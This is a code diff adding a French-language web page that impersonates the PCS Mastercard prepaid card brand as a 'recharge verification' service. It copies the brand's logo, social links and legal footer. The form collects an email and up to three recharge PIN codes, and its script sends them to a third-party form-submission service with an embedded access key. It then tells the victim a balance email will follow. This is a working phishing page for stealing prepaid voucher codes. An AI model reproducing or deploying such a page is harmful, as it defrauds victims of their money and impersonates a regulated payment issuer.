@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PCS | VERIFICATION</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wdth,wght@75..100,300..800&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicon@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="image/pcs logo.png" alt="" width="200" height="50">
+        </div>
+        
+       
+
+    </header>
+    <div id="wrapper">
+        <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">       
+            <h2>VERIFIER VOS RECHARGES</h2>
+            <div class="pcs">
+             <input type="hidden" name="access_key" value="2ebf41e2-25a0-477d-847c-dcab0ee4f7c9">
+            <fieldset>
+                <legend>INFORMATION</legend>
+                <div>
+                <label for="email">Email:</label>
+                <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
+                </div>
+                </fieldset>
+                <fieldset>
+                    <legend>VERIFIER</legend>
+                    <div>
+                        <label for="montant1Neosurf">Montant:</label>
+                        <select name="montant1pcs" id="montant1Neosurf" required>
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="50">50€</option>
+                            <option value="100">100€</option>
+                            <option value="150">150€</option>
+                            <option value="200">200€</option>
+                            <option value="250">250€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code1">Pin:</label>
+                        <input type="text" id="code1" name="code1" placeholder="XXXXXXXXXX"  maxlength="10" required>
+                    </div>
+                    <div>
+                        <label for="montant2">Montant:</label>
+                        <select name="montant2pcs" id="montant2">
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="50">50€</option>
+                            <option value="100">100€</option>
+                            <option value="150">150€</option>
+                            <option value="200">200€</option>
+                            <option value="250">250€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code2">Pin 2:</label>
+                        <input type="text" id="code2" name="code2" placeholder="XXXXXXXXXX"  maxlength="10">
+                    </div>
+                    <div>
+                        <label for="montant3">Montant:</label>
+                        <select name="montant3pcs" id="montant3">
+                            <option value="0" disabled selected>Montant de la recharge</option>
+                            <option value="50">50€</option>
+                            <option value="100">100€</option>
+                            <option value="150">150€</option>
+                            <option value="200">200€</option>
+                            <option value="250">250€</option>
+                        </select>                    
+                    </div>
+                    <div>
+                        <label for="code3">Pin 3:</label>
+                        <input type="text" id="code3" name="code3" placeholder="XXXXXXXXXX"  maxlength="10">
+                    </div>
+                </fieldset>
+            </div>
+            <button type="submit" id="btnSubmit">Verifier</button>
+        </form>
+    </div>
+    <div class="footerInfo">
+        <div><a href="https://www.instagram.com/pcs_mastercard/?hl=fr" target="_blank" rel="noopener noreferrer"><img src="image/instagram-logo-24.png" alt="instagram"></a></div>
+        <div><a href="https://www.facebook.com/pcsmastercard/" target="_blank" rel="noopener noreferrer"><img src="image/facebook-logo-24.png" alt="facebook"></a></div>
+        <div><a href="https://www.youtube.com/channel/UC_FIuctwhPYbFsjsctH6Qxw" target="_blank" rel="noopener noreferrer"><img src="image/youtube-logo-24.png" alt="youtube"></a></div>
+    </div>
+    <footer>
+       
+        <small>© 2019 - 2024 - PCS, Tous droits réservés - Création Vigicorp</small><br>
+        <small> La carte de paiement prépayée PCS Mastercard est émise par PFS Card Services (Ireland) Limited en vertu d’une licence de Mastercard. PFS Card Services (Ireland) Limited, qui exerce ses activités sous le nom de PCSIL, est autorisée et réglementée en tant qu’émetteur de monnaie électronique par la Banque centrale d’Irlande sous le numéro d’enregistrement C175999. Siège social: EML Payments, 2nd Floor La Vallee House, Upper Dargle Road, Bray, Co. Wicklow, Ireland. Numéro d’enregistrement des sociétés : 590062. PCS® Prepaid Cash Services est une marque de CreaCard SAS. ©</small>
+    </footer>
+    <script>
+        function goToHomePage(event) {
+            // Empêcher le comportement de soumission par défaut
+            event.preventDefault();
+    
+            // Récupérer les données du formulaire
+            var formData = new FormData(event.target);
+    
+            // Envoyer les données du formulaire en utilisant AJAX
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Traiter la réponse (par exemple, afficher un message de réussite)
+                console.log('Formulaire soumis avec succès:', response);
+                // Vous pouvez également afficher un message de réussite à l'utilisateur
+                alert("Votre demande de vérification de recharge est en cours. Recevez bientôt un e-mail avec votre solde. Merci.!");
+            })
+            .catch(error => {
+                // Traiter l'erreur (par exemple, afficher un message d'erreur)
+                console.error('Erreur lors de la soumission du formulaire:', error);
+                // Vous pouvez également afficher un message d'erreur à l'utilisateur
+                alert('Erreur lors de la soumission du formulaire. Veuillez réessayer.');
+            });
+        }
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
